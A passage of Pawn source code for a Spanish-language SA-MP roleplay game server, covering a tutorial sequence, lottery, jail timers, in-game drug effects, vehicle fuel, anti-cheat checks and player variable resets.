	return tires1 | (tires2 << 1) | (tires3 << 2) | (tires4 << 3);
}
stock MoneyResetToPlayer(playerid){
	cuenta[playerid][cDinero] = 0;
	return ResetPlayerMoney(playerid);
}
stock MoneyGiveToPlayer(playerid, money){
	ResetPlayerMoney(playerid);
	cuenta[playerid][cDinero] += money;
	return GivePlayerMoney(playerid, cuenta[playerid][cDinero]);
}
stock GetWeaponNameEx(id, name[], len)return format(name, len, "%s", GunNames[id]);
stock GetClosestVehicleForPlayer(playerid)
{
        new Float:x, Float:y, Float:z;GetPlayerPos(playerid, x, y, z);
        return GetClosestVehicleFromPoint(x, y);
}
forward Float:GetDistance(Float: x1, Float: y1, Float: z1, Float: x2, Float: y2, Float: z2);
stock Float:GetDistance(Float: x1, Float: y1, Float: z1, Float: x2, Float: y2, Float: z2)
{
	new Float:d;
	d += floatpower(x1-x2, 2.0);
	d += floatpower(y1-y2, 2.0);
	d += floatpower(z1-z2, 2.0);
	d = floatsqroot(d);
	return d;
}
forward Float:SubWooferR(Float:posX, Float:posY, Float:posZ, playerid);
stock Float:SubWooferR(Float:posX, Float:posY, Float:posZ, playerid)
{
	new Float: WooferDistance;
	 WooferDistance = GetDistance(posX, posY, posZ, InfoWoofer[playerid][WoPosX], InfoWoofer[playerid][WoPosY], InfoWoofer[playerid][WoPosZ]);
    return  WooferDistance;
}
forward Float:GetDistanceBetweenPlayerss(iPlayerOne, iPlayerTwo);
Float:GetDistanceBetweenPlayerss(iPlayerOne, iPlayerTwo)
{
	new
		Float: fPlayerPos[3];

	GetPlayerPos(iPlayerOne, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
	return GetPlayerDistanceFromPoint(iPlayerTwo, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
}
stock Float:GetDistanceBetweenPoints(Float:x, Float:y, Float:tx, Float:ty)
{
  new Float:temp1, Float:temp2;
  temp1 = x-tx;temp2 = y-ty;
  return floatsqroot(temp1*temp1+temp2*temp2);
}
stock GetClosestVehicleFromPoint(Float:x, Float:y)
{
        new Float:distance = 5, Float:tx, Float:ty, Float:z, vehicleid = -1;
        for(new i = 0;i<MAX_VEHICLES;i++)
        {
            	GetVehiclePos(i, tx, ty, z);
                new Float:temp = GetDistanceBetweenPoints(x, y, tx, ty);
                if(temp < distance)
                {
                        vehicleid = i;
                        distance = temp;
                }
        }
        return vehicleid;
}

stock Float:GetDistanceBetweenPlayers(p1, p2)
{
	new Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2;
	if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
	{
		return -1.00;
	}
	GetPlayerPos(p1, x1, y1, z1);
	GetPlayerPos(p2, x2, y2, z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2, x1)), 2)+floatpower(floatabs(floatsub(y2, y1)), 2)+floatpower(floatabs(floatsub(z2, z1)), 2));
}
/******************************************************************************/
/*******************************[- CallBacks -]********************************/
/******************************************************************************/
CallBack::CambiarPagina(playerid)
{
	new string[524];
	switch(CambioPagina[playerid])
	{
		case 1:
		{
			SetPlayerCameraPos(playerid, 1516.905395, -1646.476806, 37.341583);
			SetPlayerCameraLookAt(playerid, 1519.915649, -1649.240844, 34.460830);
			SetPlayerPos(playerid, 1516.905395, -1646.476806, 0.0000);
			
			format(string, sizeof(string), "Lo primordial es que sepas que esto es un servidor ~r~RolePlay~n~~w~A que nos referimos con Roleplay? Bien, este modo de ~n~juego consiste en simular la vida real pero dentro del servidor.~n~Tenemos que simularlo lo mas parecido posible a la vida real.~n~Podes tomar diferentes caminos, tanto legalal o ilegal... ~n~~g~Todo depende de ti.~n~");
			PlayerTextDrawSetString(playerid, InfoText[playerid][4], string);
			PlayerTextDrawShow(playerid, InfoText[playerid][4]);
			
			ClearChatbox(playerid, 21);
			TogglePlayerControllable(playerid, false);
		}
		case 2:
		{
			SetPlayerCameraPos(playerid, 1471.873535, -879.328735, 105.446037);
			SetPlayerCameraLookAt(playerid, 1470.324096, -874.936523, 103.627281);
			SetPlayerPos(playerid, 1471.873535, -879.328735, 0.0000);
			
			format(string, sizeof(string), "Recuerda que la administracion esta siempre a tu disposicion.~n~Puedes solicitarlos por ~r~/w~w~ o ~r~/solicitaradmin.~w~~n~Si tienes alguna duda sobre el servidor, tienes el comando ~r~/duda~w~.~n~Alguien esta cometiendo una infraccion? Usa ~r~/re~w~ para reportarle.~n~Tambien te recordamos que tienes el ~r~/ayuda~w~ para revisar comandos.~n~");
			PlayerTextDrawSetString(playerid, InfoText[playerid][4], string);
			PlayerTextDrawShow(playerid, InfoText[playerid][4]);
			
			ClearChatbox(playerid, 21);
		}
		case 3:
		{
			SetPlayerCameraPos(playerid, 1832.036743, -1867.144409, 35.919425);
			SetPlayerCameraLookAt(playerid, 1828.430908, -1869.829833, 33.731708);
			SetPlayerPos(playerid, 1832.036743, -1867.144409, 0.0000);
			
			format(string, sizeof(string), "Empiezas tu vida en Los Santos! Lo principal es conseguir un trabajo!~n~Tienes bastantes opciones de trabajo que podras buscar en el GPS!~n~Casi todos los trabajos tienen habilidad, no olvides subirla!~n~");
			PlayerTextDrawSetString(playerid, InfoText[playerid][4], string);
			PlayerTextDrawShow(playerid, InfoText[playerid][4]);
			
			ClearChatbox(playerid, 21);
		}
		case 4:
		{
			SetPlayerCameraPos(playerid, 2245.186523, -2232.575439, 27.272123);
			SetPlayerCameraLookAt(playerid, 2240.355712, -2232.531250, 25.983198);
			SetPlayerPos(playerid, 2245.186523, -2232.575439, 0.0000);
			
			format(string, sizeof(string), "Podras formar parte de facciones! Hay bastantes a tu disposicion~n~como ~g~LSPD, SAEM, CPLS ~w~(mecanicos), ~g~CNN...~n~~w~Tambien puedes crear tu faccion ~r~Ilegal~w~ via foro y hacerla oficial!~n~Para las ~g~Legales~w~ deberas mandar postulacion via foro para ser parte!~n~Sin emabrgo para entrar a facciones ~r~Ilegales~w~ deberas hacerlo IC.~n~");
			PlayerTextDrawSetString(playerid, InfoText[playerid][4], string);
			PlayerTextDrawShow(playerid, InfoText[playerid][4]);
			
			ClearChatbox(playerid, 21);
		}
		case 5:
		{
			SetPlayerCameraPos(playerid, 2693.651611, -1644.348999, 38.735260);
			SetPlayerCameraLookAt(playerid, 2693.583007, -1648.947387, 36.773063);
			SetPlayerPos(playerid, 2693.651611, -1644.348999, 0.0000);

			format(string, sizeof(string), "Muy importante es la diversion! Hay muchas formas de divertirte!~n~Por ejemplo, tienes el paintball en el estadio, la pista de karts.~n~Tambien podras organizar fiestas y usar un stereo ~n~que podras comprar en la tienda electronica!~n~La administracion cada cierto tiempo suele realizar eventos...~n~ En resumen, diversion asegurada en ~r~ZonaZero RP!~n~");
			PlayerTextDrawSetString(playerid, InfoText[playerid][4], string);
			PlayerTextDrawShow(playerid, InfoText[playerid][4]);
			
			ClearChatbox(playerid, 21);
		}
		case 6:
		{
			SetPlayerCameraPos(playerid, 1706.038330, -1884.440307, 16.989686);
			SetPlayerCameraLookAt(playerid, 1708.589233, -1888.436035, 15.400044);
			SetPlayerPos(playerid, 1711.2914, -1894.8475, 13.5675);
			SetPlayerFacingAngle(playerid, 2.2963);
			
			format(string, sizeof(string), "Ahora deberas pasar un pequeño cuestionario para ingresar!~w~~n~Recuerda que estamos en constante desarollo para mejorar ZZ!~n~~g~Gracias por elegirnos!~n~");
			PlayerTextDrawSetString(playerid, InfoText[playerid][4], string);
			PlayerTextDrawShow(playerid, InfoText[playerid][4]);
			
			ClearChatbox(playerid, 21);
		}
		case 7:
		{
			ClearChatbox(playerid, 21);
			Mensaje(playerid, -1, "Conductor Tren: Hemos llegado a Los Santos!, sin embargo ya nos iremos, todos a bordo, siguiente parada San Fierro!");
			Mensaje(playerid, COLOR_AZUL_CLARO, "Bienvenido! {FFFFFF}Si tienes alguna inquietud, puedes publicarla en el canal de ayuda o{FFFF00} /duda.");
			Mensaje(playerid, COLOR_AZUL_CLARO, "Informacion: {FFFFFF}Si deseas que tu personaje tenga un acento, puedes utilizar{EF9995} /acento.");

			Mensaje(playerid, COLOR_AMARILLO2, ">>{FFFFFF} Stats de regalo:");
			Mensaje(playerid, COLOR_AZUL_CLARO, ">>{FFFFFF} Usted acaba de obtener paquete con beneficios Gold por 3 horas.");
			Mensaje(playerid, COLOR_AZUL_CLARO, ">>{FFFFFF} Se te añadio a tu cuenta Bancaria 3500$.");
			Mensaje(playerid, COLOR_AZUL_CLARO, ">>{FFFFFF} Observar beneficios Utiliza: /paquete.");
			Mensaje(playerid, COLOR_AZUL_CLARO, ">>{AA3333} Restriccion de armas por 2 horas!");

			cuenta[playerid][cRegistro] = 1;
			cuenta[playerid][cTutorial] = 1;
			cuenta[playerid][cTraje] = 26;
			cuenta[playerid][cNivel] = 1;
			cuenta[playerid][cDineroBanco] = 3500;
			cuenta[playerid][cDinero] = 3000;
			cuenta[playerid][cPack] = gettime() + 10800;
			cuenta[playerid][cPackID] = 1;
			
			booleano[gOoc]{playerid} = false;
			booleano[gNews]{playerid} = false;
			booleano[gFam]{playerid} = false;

			UpdatePlayerStat(playerid);
			HacerPruebaRol(playerid);
			
			for(new p=0;p<5;p++) TextDrawHideForPlayer(playerid, Presentacion[p]);
			PlayerTextDrawHide(playerid, InfoText[playerid][4]);
			PlayerTextDrawHide(playerid, InfoText[playerid][14]);
			CancelSelectTextDraw(playerid);
			TogglePlayerControllable(playerid, true);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetCameraBehindPlayer(playerid);
			SetCameraBehindPlayer(playerid);
			SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
			SetPlayerPos(playerid, 1711.2914, -1894.8475, 13.5675);
			SetPlayerFacingAngle(playerid, 2.2963);
		}
	}
	return 1;
}
CallBack::HideInfoForPlayer(playerid)
{
   if(!IsPlayerConnected(playerid))return 1;
   PlayerTextDrawHide(playerid, InfoText[playerid][0]); 
   return 1;
}
CallBack::AjustarTextDraw()
{
	ValorConteo--;
	if(ValorConteo <= 0)
	{
		KillTimer(TimerConteo);
		MensajeGlobal(COLOR_AMARILLO, "AdminInfo:{FFFFFF} Los vehiculos fueron respawneados con éxito!");
		TextDrawHideForAll(respawntime); Conteo = 0;
		new bool:unwanted[MAX_VEHICLES];
		for(new i=0, t=GetMaxPlayers();i<t;i++)
		{
			if(IsPlayerConnected(i))
			{
				if(IsPlayerInAnyVehicle(i)) unwanted[GetPlayerVehicleID(i)] = true;
			}
		}
		for(new car=0; car<MAX_VEHICLES; car++)
		{
			spawnAuto(!unwanted[car] ? (car) : (0));
		}
	}
	else
	{
	new string[128];
	format(string, sizeof(string), "Respawn de coches sin uso en: %d", ValorConteo);
	TextDrawSetString(respawntime, string);
	TextDrawShowForAll(respawntime);
	}
	return 1;
}
CallBack::SafeLoadObjects(playerid)
{
	if(GetPVarType(playerid, "LoadingObjects"))
	{
		DeletePVar(playerid, "LoadingObjects");
		TogglePlayerControllable(playerid, 1); 
		TextDrawHideForPlayer(playerid, streamer);
	}
}
CallBack::Lotto(number)
{
	if(!number) number = random(30) + 100;
	
	new JackpotFallen = 0;
	new string[128];
	format(string, sizeof(string), "Noticias de la Loteria: {FFFFFF}Hoy en dia el numero ganador ha recaido en: {FF0000}%d", number);
    OOCOff(COLOR_NARANJA, string);
    for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(cuenta[i][cLoteria] > 0)
			{
			    if(cuenta[i][cLoteria] == number)
				{
			        JackpotFallen = 1;
					format(string, sizeof(string), "Noticias de la Loteria: %s ha ganado el acumulado de $%d .", PlayerName(i), Jackpot);
					OOCOff(COLOR_AZUL_CLARO, string);
					format(string, sizeof(string), "* Usted ha ganado $%d con su billete de loteria.", Jackpot);
					Mensaje(i, COLOR_AMARILLO2, string);
					MoneyGiveToPlayer(i, Jackpot);
			    }
			    else
			    {
			        Mensaje(i, COLOR_BLANCO, "* Usted no ha ganado con su billete de loteria este momento.");
			    }
			}
			cuenta[i][cLoteria] = 0;
		}
	}
	if(JackpotFallen)
	{
	    new rand = random(3500); rand += 400;
	    Jackpot = rand; 
	    format(string, sizeof(string), "El nuevo Jackpot se ha iniciado con {9EC73D}$%d", Jackpot);
		OOCOff(0xFFFFFFFF, string);
	}
	else
	{
	    new rand = random(3600); rand += 500;
	    Jackpot += rand; 
	    format(string, sizeof(string), "El bote se ha aumentado a {9EC73D}$%d", Jackpot);
		OOCOff(0xFFFFFFFF, string);
	}
	return 1;
}
CallBack::SetPlayerUnjail()
{
	new string[128], Float:armor;
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerConnected(i))
		{			
		    if(cuenta[i][cCarcel] > 0)
		    {
				if(cuenta[i][cTiempoCarcel] > 0)
				{
					cuenta[i][cTiempoCarcel]--;
				}
				if(cuenta[i][cTiempoCarcel] <= 0)
				{
				    cuenta[i][cTiempoCarcel] = 0;
				    switch(cuenta[i][cCarcel])
				    {
				        case 1:
				        {
				            SetPlayerInterior(i, 0);
					    	cuenta[i][cInterior] = 0;
					    	SetPlayerPos(i, 2047.1602, -2095.8225, 13.5469);
			    		}
				        case 3:
				        {
							SetPlayerPos(i, 2047.1602, -2095.8225, 13.5469);
							cuenta[i][cBusqueda] = 0;
						}
						case 4:
						{
							SetPosEx(i, 230.1667, 141.7600, 1003.0234, 280.4726, 3, 0);
							cuenta[i][cBusqueda] = 0; 
						}
						case 5:
						{
							SetPosEx(i, 2440.4939, 2371.7617, 11.1414, 87.1910, 0, 0);
							cuenta[i][cBusqueda] = 0; 
						}
                         case 6:
				        {
				            SetPlayerInterior(i, 0);
					    	cuenta[i][cInterior] = 0;
					    	SetPlayerPos(i, 1838.7532, -1368.2268, 13.5625);
			    		}
					}
					cuenta[i][cCarcel] = 0;
					Mensaje(i, COLOR_GRIS1, "Guardia: Usted ha sido dejado en libertad.");
					Mensaje(i, COLOR_GRIS1, "Guardia: Piense un tiempo, antes de que usted cometa un crimen.");
					GameTextForPlayer(i, "~g~Dejado En Libertad~n~~w~Trate de ser un mejor ciudadano", 5000, 1); 
				}
			}
		    if(UsedFind[i] >= 1)
		    {
		        UsedFind[i] -= 1;
		    }
			if(UsingRitalin[i] > 0)
			{
			    if(UsingRitalin[i] == 200 && armor < 101){ darArmadura(i, armor+20); }
			    if(UsingRitalin[i] == 100 && armor < 101){ darArmadura(i, armor+20); }
			    UsingRitalin[i] -= 1;
			}
			if(UsingRitalin[i] == 0 &&RitalinEffect[i] == 1 && UsingDrugs[i] == 1)
			{
			    GameTextForPlayer(i, "~w~Efecto ~b~ritalin ~n~~w~pasado", 5000, 1);
			    UsingDrugs[i] = 0;
       			SetPlayerWeather(i, DefaultWeather);
       			UsingRitalin[i] = 0;
			    RitalinEffect[i] = 0;
			}
			if(UsingHeroina[i] > 0)
			{
			    new Float:PlayerHealth;
			    GetPlayerHealth(i, PlayerHealth);
			    new crack = random(10);
			    if(crack == 2){ ApplyAnimation(i, "CRACK", "crckdeth2", 2.5, 0, 0, 0, 0, 5000); }
			    if(HeroinaBeat[i] == 1){ SetHP(i, PlayerHealth-1);}
			    UsingHeroina[i] -= 1;
			}
			if(UsingHeroina[i] == 0 &&HeroinaEffect[i] == 1 && UsingDrugs[i] == 1)
			{
			    GameTextForPlayer(i, "~w~Efecto ~g~heroina ~n~~w~pasado", 5000, 1);
			    UsingDrugs[i] = 0;
       			UsingHeroina[i] = 0;
			    HeroinaEffect[i] = 0;
			    HeroinaBeat[i] = 0;
			    SetHP(i, 25);
			}
			if(UsingMarihuana[i] > 0)
			{
			    new Float:PlayerHealth;
			    GetPlayerHealth(i, PlayerHealth);
			    new crack = random(10);
			    if(crack == 2){ ApplyAnimation(i, "CRACK", "crckdeth2", 2.5, 0, 0, 0, 0, 5000); }
			    if(MarihuanaBeat[i] == 1){ SetHP(i, PlayerHealth-1);}
			    UsingMarihuana[i] -= 1;
			}
			if(UsingMarihuana[i] == 0 &&MarihuanaEffect[i] == 1 && UsingDrugs[i] == 1)
			{
			    GameTextForPlayer(i, "~w~Efecto ~g~marihuana ~n~~w~pasado", 5000, 1);
			    UsingDrugs[i] = 0;
       			UsingMarihuana[i] = 0;
			    MarihuanaEffect[i] = 0;
			    MarihuanaBeat[i] = 0;
			    SetHP(i, 25);
			}
			if(Left4Life[i] > 0)
			{
				switch(Left4Life[i])
				{
				    case 1:{
						format(string, sizeof(string), "* %s muere desangrado.", PlayerName(i));
		    			ProxDetector(30.0, i, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					    SetHP(i, 0);
					    cuenta[i][pEpilepsia] += 1;
				    	cuenta[i][pCancer] += 3;
						Left4Life[i] = 0;
					}
					case 30:
					{
						format(string, sizeof(string), "* %s agoniza lentamente.", PlayerName(i));
					    ProxDetector(30.0, i, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
        				new Float:PlayerHealth;
					    GetPlayerHealth(i, PlayerHealth);
                	    SetHP(i, PlayerHealth-5);
                    	if(!booleano[Rescued]{i}){
	                    	ApplyAnimation(i, "CRACK", "crckdeth4", 2.5, 1, 0, 1, 0, 0);
    	                	ApplyAnimation(i, "CRACK", "crckdeth4", 2.5, 1, 0, 1, 0, 0);
					 	}
					}
					case 100:
					{
						format(string, sizeof(string), "* %s empieza a sangrar más.", PlayerName(i));
					    ProxDetector(30.0, i, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					    new Float:PlayerHealth;
					    GetPlayerHealth(i, PlayerHealth);
                	    SetHP(i, PlayerHealth-3);
                    	if(!booleano[Rescued]{i}){
	                    	ApplyAnimation(i, "CRACK", "crckdeth2", 2.5, 1, 0, 1, 0, 0);
    	                	ApplyAnimation(i, "CRACK", "crckdeth2", 2.5, 1, 0, 1, 0, 0);
        	            }
					}
					case 150:
					{
						format(string, sizeof(string), "* %s se encuentra incosciente y sangrando.", PlayerName(i));
					    ProxDetector(30.0, i, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					    new Float:PlayerHealth;
					    GetPlayerHealth(i, PlayerHealth);
                	    SetHP(i, PlayerHealth-2);
                    	if(!booleano[Rescued]{i}){
	                    	ApplyAnimation(i, "CRACK", "crckdeth1", 2.5, 1, 0, 1, 0, 0);
    	                	ApplyAnimation(i, "CRACK", "crckdeth1", 2.5, 1, 0, 1, 0, 0);
					 	}
					}
				}
				Left4Life[i] -= 1;
			}
		}
	}
}
CallBack::restarGasolina()
{
	new engine, lights, alarm, doors, bonnet, boot, objective;
	for(new i=1;i<VEHICULOS_COMPRABLES;i++)
	{
		if(!EsBicicleta(i))
		{
			if(vehiculoEncendido[i] && EsComprable(i))
			{
				if(Gas[i] >= 10 && !IsAPlane(i))
				{
					Gas[i] -= 3;
				}
				if(autos[i][cOwned] && autos[i][cBattery])
				{
					autos[i][cBattery] -= 3;
					if(autos[i][cBattery] < 40)
					{
						GetVehicleParamsEx(i, engine, lights, alarm, doors, bonnet, boot, objective);
						SetVehicleParamsEx(i, 0, lights, alarm, doors, bonnet, boot, objective);
						vehiculoEncendido[i] = false;
					}
				}
			}
		}
	}
	CheckCarHealth();
	return 1;
}
CallBack::SetPlayerWeapons(playerid)
{ 
	if(IsPlayerConnected(playerid))
	{
		if(cuenta[playerid][cCarcel] < 1)
		{
			for(new i;i < 12; i++){
				if(cuenta[playerid][cArma][i] && cuenta[playerid][cMunicion][i])
				{
					darArma(playerid, cuenta[playerid][cArma][i], cuenta[playerid][cMunicion][i]);
					cuenta[playerid][cArma][i] = 0;
					cuenta[playerid][cMunicion][i] = 0;
				}
			}
		}
	} 
	return 1;
}
CallBack::StreamCincoSegundos()
{
	for(new playerid=0, _max=GetMaxPlayers();playerid<_max;playerid++)
	{
		enteroChar[nPagarContador]{playerid} = 0;
	}
	for(new i=0;i<MAX_ANUNCIOS;i++)
	{
		if(Publicidad[i][_pTime] != 0 && gettime() >= Publicidad[i][_pTime])
		{
			Publicidad[i][_pTime] = 0;
			DestroyObject(Publicidad[i][_pObjecto]);
			Publicidad[i][_pObjecto] = CreateObject(4729, Publicidad[i][_pPosx], Publicidad[i][_pPosy], Publicidad[i][_pPosz], 0.0000, 0.0000, Publicidad[i][_pPosrz], 1000.0);
			SetObjectMaterialText(Publicidad[i][_pObjecto], "Center Island RolePlay\n\n {FFFFFF}Publicidad Disponible", 0, 120, "impact", 32, 0, -32256, -16777216, 1);
		}
	}
	return 1;
}
CallBack::StreamMedioSegundo()
{
	for(new playerid=0, _max=GetMaxPlayers();playerid<_max;playerid++)
	{
		new string[256];
		if(!IsPlayerConnected(playerid)) continue;
		new vehicleid = GetPlayerVehicleID(playerid);
		
		if(vehicleid != 0) GetVehiclePos(vehicleid, gVps[vehicleid][0], gVps[vehicleid][1], gVps[vehicleid][2]);
		if(IsPlayerInAnyVehicle(playerid))
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				//anti - Driver
				SetPlayerArmedWeapon(playerid, 0);
				
				new Float:v_health, stats[2][24];
				GetVehicleHealth(vehicleid, v_health);
				switch(floatround(v_health)){
					case 0 .. 300:		stats[0] = "Averiado";
					case 301 .. 500: 	stats[0] = "Grave";
					case 501 .. 700: 	stats[0] = "Estable";
					case 701 .. 900: 	stats[0] = "Normal";
					default: 			stats[0] = "Perfecto";
				}
				
				GetPlayer2DZone(playerid, stats[1], MAX_ZONE_NAME);
				format(string, sizeof(string), "~n~   ~y~~h~Estado~w~: %s~n~   ~y~~h~Bateria~w~: %dWt~n~   ~y~~h~Gasolina~w~: %d~n~   ~y~~h~KM/H~w~: %d~n~   ~y~~h~GPS~w~:~n~   %s~n~", 
				stats[0], (vehicleid > 799)?(1000):(autos[vehicleid][cBattery]), Gas[vehicleid], GetVehicleSpeed(playerid), stats[1]);
				PlayerTextDrawSetString(playerid, InfoText[playerid][11], string);
			}
		}
		//Textdraw Banco y Barra
		new date[3];
		getdate(date[0], date[1], date[2]);
		format(string, sizeof(string), "     ~p~>~w~foro.CenterIsland.com     ~g~>~w~Nivel: %d ~r~>~w~Experiencia: %d/%d ~y~>~w~Fecha: %02d/%02d/%04d    ~b~>~w~RolePlay "Version"", cuenta[playerid][cNivel], cuenta[playerid][cExperiencia], (cuenta[playerid][cNivel] + 1) * levelexp, date[2], date[1], date[0]);
		PlayerTextDrawSetString(playerid, InfoText[playerid][1], string);
		format(string, sizeof(string), "~b~$~w~%08d", cuenta[playerid][cDineroBanco]);
		PlayerTextDrawSetString(playerid, InfoText[playerid][3], string);
		if(!booleano[TextShow]{playerid} && cuenta[playerid][cTutorial] && booleano[gIngreso]{playerid})
		{
			PlayerTextDrawShow(playerid, InfoText[playerid][1]);
			PlayerTextDrawShow(playerid, InfoText[playerid][2]);
			PlayerTextDrawShow(playerid, InfoText[playerid][3]); 
			ShowProgressBarForPlayer(playerid, bHambre[playerid]);
		}
		//Verificar que no Utiliza: cheat de dinero.
		if(GetPlayerMoney(playerid) != cuenta[playerid][cDinero])
		{
			ResetPlayerMoney(playerid);
			GivePlayerMoney(playerid, cuenta[playerid][cDinero]);
		}
		switch(GetPlayerWeapon(playerid))
		{
			case 26, 35 .. 40, 44, 45:
			{
				quitarArmas(playerid);
			}
		}
		//
		if(entero[playerid][lictiempo])
		{
			format(string, sizeof(string), "%s", generarTiempo(gettime() - entero[playerid][lictiempo]));
			GameTextForPlayer(playerid, string, 500, 6);
		}
		//Verificar que no Utiliza: vida ni armadura cheat
		new Float:health, Float:armadura;
		GetPlayerHealth(playerid, health);
		GetPlayerArmour(playerid, armadura);
		if(booleano[gIngreso]{playerid} && health > cuenta[playerid][cVida]) SetHP(playerid, cuenta[playerid][cVida]);
		if(booleano[gIngreso]{playerid} && armadura > cuenta[playerid][cArmadura]) darArmadura(playerid, cuenta[playerid][cArmadura]);
	}
	for(new i=0; i<sizeof visualizador; i++)
	{
		if(!visualizador[i][visualUse])continue;
		visualizador[i][visualPos][3] += 5.0;
		SetVehicleZAngle(visualizador[i][visualCoche], visualizador[i][visualPos][3]);
	}
	return 1;
}
CallBack::StreamSegundo()
{    
    for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
    	if(AntiFloodCommand[i][0] != 0) AntiFloodCommand[i][0]--;
		
		if(!booleano[TextShow]{i})
		{
			if(cuenta[i][cHambre] < 0) cuenta[i][cHambre] = 0;
			SetProgressBarValue(bHambre[i], cuenta[i][cHambre]);
		}
		
		if(cuenta[i][temporiz] > gettime())
		{
			new string[24], tempkk = cuenta[i][temporiz] - gettime();
			if(tempkk <= 60)
			{
				format(string, sizeof(string), "%d", tempkk);
			}
			else
			{
				format(string, sizeof(string), "%d:%d", tempkk / 60, tempkk % 60);
			}
			PlayerTextDrawSetString(i, InfoText[i][13], string);
		}
		else
		{
			PlayerTextDrawHide(i, InfoText[i][13]);
		}
    }
    RevisarCoches();
    UnSegundoStreamed();
    SetPlayerUnjail();
    OtherTimer();
    CheckVida();
		
	new string[128];
	for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
	{
		if(semillas[f][sSlot])
		{
			if(semillas[f][sTime] >= gettime())
			{
				format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: %s\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], ObtenerTiempoRestante(semillas[f][sTime]), semillas[f][sDueno]);
				UpdateDynamic3DTextLabelText(semillas[f][sLabel], -1, string);
			}
			else
			{
				format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: {00ff00}Lista\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], semillas[f][sDueno]);
				UpdateDynamic3DTextLabelText(semillas[f][sLabel], -1, string);
			}
		}
	}
	//Sistema de rejas
	for(new x=0;x<sizeof(rejas);x++)
	{
		if(rejas[x][reEstado] && gettime() > rejas[x][reEstado])
		{
			rejas[x][reEstado] = 0;
			MoveDynamicObject(rejas[x][reID], rejas[x][rePos][6], rejas[x][rePos][7], rejas[x][rePos][8], 3.0, rejas[x][rePos][9], rejas[x][rePos][10], rejas[x][rePos][11]);
		} 
	}
    return 1;
}

CallBack::ResetearVariables(playerid)
{
	CambioPagina[playerid] = 0;
	TimeAFK[playerid] = 0;      
	AFKCount[playerid] = 0;
	Left4Life[playerid]=0; 
	Accesory[playerid] = 0;         
	CallCost[playerid] = 0;
	UsedFind[playerid] = 0;             
	ActiveTeleport[playerid] = 0;
	Freezed[playerid] = 0; 			
	Condom[playerid] = 0;
	LiveOffer[playerid] = 999;      
	Fichas[playerid] = 0;
	Mobile[playerid] = 255;	
	Blinded[playerid] = 0;	
	Regalo_ID[playerid] = 999;
	Tied[playerid] = 0;				
	Revisado[playerid] = 0;	
	DrugTimer[playerid] = 0;            
	See_MP[playerid] = 0;           
	Regalo_ITEM[playerid] = 0; 
	HouseExplo[playerid] = 9999;
	TicketOffer[playerid] = 999;	
	TicketMoney[playerid] = 0;       		
	YaAposto[playerid] = 0;
	HireKey[playerid] = 9999; 		
	HireKeyTime[playerid] = 0;		
	BuyNarco[playerid] = 999;
	Hotdog[playerid] = 0;			
	JustDied[playerid] = 0; 	
	KnockedDown[playerid] = 0; 			
	Divorciar[playerid] = 999;      
	Speaker[playerid] = 0;
	UsingDrugs[playerid] = 0; 	    
	Saludo_ID[playerid] = 999;  
	ReduceTimeb[playerid] = 0;
	UsingEctasy[playerid] = 0; 		
	EctasyEffect[playerid] = 0; 
	UsingRitalin[playerid] = 0; 		
	RitalinEffect[playerid] = 0; 	
	UsingMarihuana[playerid] = 0;
	MarihuanaEffect[playerid] = 0; 
	MarihuanaBeat[playerid] = 0; 
	UsingHeroina[playerid] = 0; 		
	HeroinaEffect[playerid] = 0; 	
	HeroinaBeat[playerid] = 0;
	peticionIDofertante[playerid] = 999; 							
	peticionIDItem[playerid] = 999; 		
	peticionPrecio[playerid] = 0;  
	RecNumber[playerid] = 0;
	TEL_INPUT_ID[playerid] = 0;	
	JustReported[playerid] = 0;	
	Matrimonio[playerid] = 999;
	IsSmoking[playerid] = 0;	
	Color[playerid] = COLOR_BLANCO;
	Mochila[playerid][0] = 0;
	Mochila[playerid][1] = 0;
	PFrecuencia[playerid] = 0;
	CanalIRC[playerid] = 0;
	cEnergysil[playerid] = 0; 		
	cNicotina[playerid] = 0;
	cSIDA[playerid] = 0; 				
	cCancer[playerid] = 0; 			
	cEpilepsia[playerid] = 0; 
	InAmbu[playerid] = 0;
	Skate[playerid] = 0;

	PlayerStatInfo[playerid][0] = "No"; 
	PlayerStatInfo[playerid][1] = "No";	
	PlayerStatInfo[playerid][3] = "No";
	PlayerStatInfo[playerid][4] = "No";	
	PlayerStatInfo[playerid][5] = "No"; 
	PlayerStatInfo[playerid][6] = "No"; 
	PlayerStatInfo[playerid][7] = "No";
	
	enteroChar[visual]{playerid} = 255;
	enteroChar[cajeroslot]{playerid} = 255;
	enteroChar[licslot]{playerid} = 255;
	enteroChar[rejaID]{playerid} = 255;
	enteroChar[rejaPasos]{playerid} = REJA_EDITOR_PASO_A;
	enteroChar[antiBH]{playerid} = 0;
	enteroChar[antiCbug]{playerid} = 0;
	enteroChar[cPrueba]{playerid} = 0;
	enteroChar[gCSpawn]{playerid} = 0;
	enteroChar[gAnden]{playerid} = 255;
	
	memset(entero[playerid], 0, _@en@entero);

	entero[playerid][gSpectea] = INVALID_PLAYER_ID;
	
	booleano[gMensajesP]{playerid} = false;
	booleano[jObjetivo]{playerid} = false;
	booleano[RadioOn]{playerid} = false;
	booleano[OnDuty]{playerid} = false;
